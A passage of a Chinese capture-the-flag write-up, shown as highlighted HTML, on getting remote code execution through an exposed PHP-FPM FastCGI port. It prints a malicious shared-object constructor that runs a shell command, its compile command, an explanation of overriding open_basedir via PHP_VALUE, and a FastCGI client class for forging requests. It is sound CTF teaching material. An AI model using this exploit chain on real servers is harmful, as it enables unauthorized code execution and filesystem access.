operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>读<code>/etc/nginx/nginx.conf</code>，发现有<code>include /etc/nginx/sites-enabled/*;</code></p><p>转头读取<code>/etc/nginx/sites-enabled/default</code></p><img src="/article/bluehat2021/image-20210503142114737.png" class="" title="cgi" loading="lazy"><p>发现在9001端口开有FastCGI服务，phpinfo中也表明该项目为FPM/FastCGI，可以通过未授权打FPM rce</p><img src="/article/bluehat2021/image-20210503141634940.png" class="" title="phpinfo" loading="lazy"><h3 id="加载恶意so文件"><a href="#加载恶意so文件" class="headerlink" title="加载恶意so文件"></a>加载恶意so文件</h3><p>写.so扩展</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / >/var/www/html/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><small>小插曲：这里发现输出到<code>/var/www/html/1</code>发现不行，结果名字换成a就可了，离谱</small></p><p>编译下</p><pre class="language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>注意的是用macos和linux编译是不同的，得用linux编译，编译完后上传至<code>/var/www/html</code></p><h3 id="伪造FastCGI请求PHP-CGI"><a href="#伪造FastCGI请求PHP-CGI" class="headerlink" title="伪造FastCGI请求PHP-CGI"></a>伪造FastCGI请求PHP-CGI</h3><p>同样写在html目录</p><blockquote><p>用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</p><blockquote><p>{<br>‘GATEWAY_INTERFACE’: ‘FastCGI/1.0’,<br>‘REQUEST_METHOD’: ‘GET’,<br>‘SCRIPT_FILENAME’: ‘/var/www/html/index.php’,<br>‘SCRIPT_NAME’: ‘/index.php’,<br>‘QUERY_STRING’: ‘?a=1&amp;b=2’,<br>‘REQUEST_URI’: ‘/index.php?a=1&amp;b=2’,<br>‘DOCUMENT_ROOT’: ‘/var/www/html’,<br>‘SERVER_SOFTWARE’: ‘php/fcgiclient’,<br>‘REMOTE_ADDR’: ‘127.0.0.1’,<br>‘REMOTE_PORT’: ‘12345’,<br>‘SERVER_ADDR’: ‘127.0.0.1’,<br>‘SERVER_PORT’: ‘80’,<br>‘SERVER_NAME’: “localhost”,<br>‘SERVER_PROTOCOL’: ‘HTTP/1.1’<br>}</p></blockquote></blockquote><ul><li>通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token single-quoted-string string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token 